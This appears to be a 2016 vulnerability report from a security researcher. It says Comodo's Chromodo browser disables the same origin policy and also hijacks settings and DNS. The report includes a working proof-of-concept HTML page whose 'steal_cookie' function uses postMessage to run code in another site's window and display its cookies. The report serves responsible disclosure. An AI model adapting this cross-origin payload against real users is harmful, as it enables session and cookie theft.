Comodo: Comodo "Chromodo" Browser disables same origin policy, Effectively turning off web security.
1 of 4
Project Member Reported by taviso@google.com, Jan 22 2016 Back to list
Issue description
When you install Comodo Internet Security, by default a new browser called Chromodo is installed and set as the default browser. Additionally, all shortcuts are replaced with Chromodo links and all settings, cookies, etc are imported from Chrome. They also hijack DNS settings, among other shady practices.

https://www.comodo.com/home/browsers-toolbars/chromodo-private-internet-browser.php

Chromodo is described as "highest levels of speed, security and privacy", but actually disables all web security. Let me repeat that, they **_disable the same origin policy_**.... ?!?..

To reproduce, do something like this:

<html>
<head></head>
<body>
<script>
function steal_cookie(obj)
{
    // Wait for the page to load
    setTimeout(function() {
        obj.postMessage(JSON.stringify({
            command: "execCode",
            code:    "alert(document.cookie)",
        }), "*");
    }, 2000);
}
</script>
<a href="javascript:steal_cookie(window.open('https://ssl.comodo.com/'))">Click Here</a>
</body>
</html>

This bug is subject to a 90 day disclosure deadline. If 90 days elapse
without a broadly available patch, then the bug report will automatically
become visible to the public.
